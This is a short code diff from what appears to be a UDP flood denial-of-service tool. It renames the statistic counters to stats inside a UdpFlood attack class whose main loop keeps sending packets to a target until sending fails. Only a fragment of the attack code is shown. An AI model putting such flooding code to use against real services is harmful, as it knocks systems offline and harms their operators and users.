@@ -41,13 +41,13 @@ class UdpFlood(AttackMethod):
 
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as udp_conn:
-            self._target.statistic.connect.status_success()
+            self._target.stats.connect.status_success()
             while self.sendto(udp_conn):
                 if self._ctx.dry_run:
                     break
                 continue
 
-            self._target.statistic.connect.status_failed()
+            self._target.stats.connect.status_failed()
             self._ctx.sock_manager.close_socket()
 
     def sendto(self, sock: socket) -> bool:
@@ -61,7 +61,7 @@ class UdpFlood(AttackMethod):
         except Exception as e:
             self._target.errors_manager.add_error(UdpSendError(message=e))
         else:
-            self._target.statistic.packets.status_sent(sent_bytes=sent)
+            self._target.stats.packets.status_sent(sent_bytes=sent)
             self._ctx.remove_error(UdpSendError(message=GETTING_SERVER_IP_ERR_MSG).uuid)
             return True
 
